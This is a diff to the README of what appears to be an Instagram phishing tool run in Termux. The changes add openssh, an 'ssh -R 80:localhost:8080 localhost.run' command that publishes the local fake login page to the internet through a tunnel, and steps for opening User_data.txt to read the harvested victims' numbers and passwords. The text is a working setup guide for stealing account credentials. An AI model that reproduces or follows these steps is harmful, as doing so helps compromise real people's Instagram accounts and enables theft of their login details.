@@ -11,7 +11,7 @@
 pkg update && pkg upgrade -y
 ```
 ```
-pkg install git
+pkg install git openssh
 ```
 ```
 git clone https://github.com/Masterdas/Instagram.git
@@ -26,6 +26,9 @@ bash setup.sh
 instagram
 ```
 ```
+ssh -R 80:localhost:8080 localhost.run
+```
+```
 nano /storage/emulated/0/Download/User_data.txt
 ```
 - `CTRL +  x enter open User_data.txt`
@@ -36,9 +39,9 @@ nano /storage/emulated/0/Download/User_data.txt
 
 2 - Packege setup bash setup.sh
 
-3  - Termux exit to Open
+3  - Termux New tap Open
  
-4 - type instagram and Start localhost
+4 - type instagram and Start Port forwarding
 
 5 - User Number/password = open file🗃️ Download
 
